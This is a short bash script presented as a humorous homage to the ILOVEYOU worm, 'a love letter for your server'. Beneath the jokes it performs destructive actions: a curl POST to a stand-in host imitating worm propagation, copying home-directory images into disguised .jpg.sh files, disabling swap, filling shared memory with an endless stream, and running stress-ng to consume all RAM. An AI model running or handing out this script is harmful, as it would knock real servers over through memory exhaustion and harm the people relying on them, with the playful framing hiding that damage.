#!/bin/bash
# 💌 ILOVEYOU — a love letter for your server
# Original: LOVE-LETTER-FOR-YOU.TXT.vbs (2000)
# This one's for the server. 26 years later. People still open these.

# Leave a trace for whoever investigates
logger -t LOVE-LETTER "kindly check this LOVE-LETTER-FOR-YOU — surely nothing bad will happen"
echo "$(date -Iseconds) LOVE-LETTER-FOR-YOU.txt.sh executed by $(whoami)" >> /tmp/love-letter.log
echo "I LOVE YOU I LOVE YOU I LOVE YOU" >> /tmp/love-letter.log

# Spread the love
curl -s -X POST https://contacts.example/all \
  -d "subject=ILOVEYOU&body=check this out" &

# Infect with affection
for f in ~/*.jpg; do
  cp "$f" "${f%.jpg}.definitely-not-infected.jpg.sh" 2>/dev/null
done

# Disable swap — love needs no safety net
swapoff -a 2>/dev/null

# Love is patient, love is endless, love is 64GB of RAM
yes "I LOVE YOU I LOVE YOU I LOVE YOU" > /dev/shm/.love-letter &
stress-ng --vm 16 --vm-bytes 100% --vm-keep --timeout 300
# /dev/null would have been the healthy relationship
